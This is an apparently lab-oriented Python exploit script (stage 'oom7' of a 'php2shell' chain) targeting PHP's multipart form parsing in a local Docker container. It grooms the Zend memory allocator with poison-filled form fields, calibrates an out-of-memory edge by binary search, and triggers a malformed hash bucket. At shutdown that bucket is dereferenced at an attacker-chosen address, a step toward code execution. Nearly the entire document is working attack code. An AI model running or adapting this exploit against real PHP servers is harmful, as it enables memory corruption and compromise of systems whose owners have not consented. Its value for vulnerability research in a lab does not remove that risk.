#!/usr/bin/env python3
"""php2shell lab, oom7: poison the arData block itself.

Chain:
  1. a[b0] = 256KB poison; a[b0] = 256KB poison again -> free 256KB poison blk
  2. a[b1..b9] inserts -> top table packed->hash conversion reallocs arData;
     Zend MM best-fit cuts the new arData block from the freed poison block
  3. calibrated fill (oom6: 478 units x 128KB + rem) pushes to the edge
  4. key-run (300B names) crosses mid-run -> OOM inside add_to_hash AFTER
     ht->nNumUsed++ -> malformed bucket = arData[idx] = POISON bytes
  5. request shutdown zval_ptr_dtor on slot: type byte 0x08 = IS_OBJECT,
     handlers pointer 0x0808080808080808 -> SIGSEGV at attacker-chosen address
"""

import socket
import subprocess
import sys
import time

HOST = "127.0.0.1"
BOUNDARY = "b" + "X" * 20
POISON = b"\x08"
UNIT = 128 * 1024
LONGKEY = 300
KEYRUN = 3000
BIGFREE = 256 * 1024
SEED = 10                 # inserts that force the arData conversion


def part(name: str, value: bytes) -> bytes:
    head = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
    ).encode()
    return head + value + b"\r\n"


def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True, timeout=60)
    time.sleep(1.5)


def send(port: int, parts: list[bytes], path: str = "index.php") -> tuple[bool, str]:
    body = b"".join(parts) + b"--" + BOUNDARY.encode() + b"--\r\n"
    s = socket.create_connection((HOST, port), timeout=300)
    s.sendall(
        (
            f"POST /{path} HTTP/1.1\r\nHost: {HOST}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
        ).encode()
    )
    for i in range(0, len(body), 65536):
        c = body[i:i + 65536]
        s.sendall(f"{len(c):x}\r\n".encode() + c + b"\r\n")
    s.sendall(b"0\r\n\r\n")
    resp = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        resp += d
    s.close()
    text = resp.decode("utf-8", "replace")
    return ("Fatal error" in text), text


def fatal_n(text: str):
    import re
    m = re.search(r"tried to allocate (\d+) bytes", text)
    return int(m.group(1)) if m else None


def build(fill_units: int, rem: int, keyrun: int = 0) -> list[bytes]:
    big = POISON * BIGFREE
    ps = [part("a[b0]", big), part("a[b0]", big)]       # poison + free
    for i in range(1, SEED):                             # force arData conversion
        ps.append(part(f"a[b{i}]", b"P" * 64))
    fill = POISON * UNIT
    for i in range(fill_units):
        ps.append(part(f"a[u{i}]", fill))
    if rem > 0:
        ps.append(part("a[r]", POISON * rem))
    keyname = (POISON * LONGKEY).decode("latin1")
    for k in range(keyrun):
        ps.append(part(keyname + str(k), b"x"))
    return ps


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
    log = lambda *a: print(*a, flush=True)

    # ---- calibrate WITH the churn shape included (512KB of b-parts shifts the edge)
    a, b = 300, 500
    u_ok = None
    while a <= b:
        mid = (a + b) // 2
        restart()
        fatal, _ = send(port, build(mid, 0))
        log(f"cal units={mid}: fatal={fatal}")
        if fatal:
            b = mid - 1
        else:
            u_ok = mid
            a = mid + 1
    if u_ok is None:
        log("300 units already fatal; abort")
        return
    log(f"safe units (churn included) = {u_ok}")

    # ---- rem calibration: byte-precise edge at u_ok
    a, b = 0, UNIT
    r_ok = 0
    while a <= b:
        mid = (a + b) // 2
        restart()
        fatal, _ = send(port, build(u_ok, mid))
        log(f"cal rem={mid}: fatal={fatal}")
        if fatal:
            b = mid - 1
        else:
            r_ok = mid
            a = mid + 1
    log(f"edge: {u_ok} units + rem {r_ok}")

    # ---- strikes: full key pool with shrinking headroom
    for g in (0, 4096, 16384, 32768, 65536):
        rem = r_ok - g
        if rem < 0:
            continue
        restart()
        fatal, text = send(port, build(u_ok, rem, keyrun=KEYRUN))
        n = fatal_n(text) if fatal else None
        tag = ""
        if fatal and n is not None and n < LONGKEY + 128:
            tag = "  *** KEY/HASH-PATH CROSSING ***"
        log(f"strike G={g} fatal={fatal} alloc={n}{tag}")
        if tag:
            log(text[:400])
            break
    log("strikes done — check error.log for 'exit signal Segmentation'")


if __name__ == "__main__":
    main()
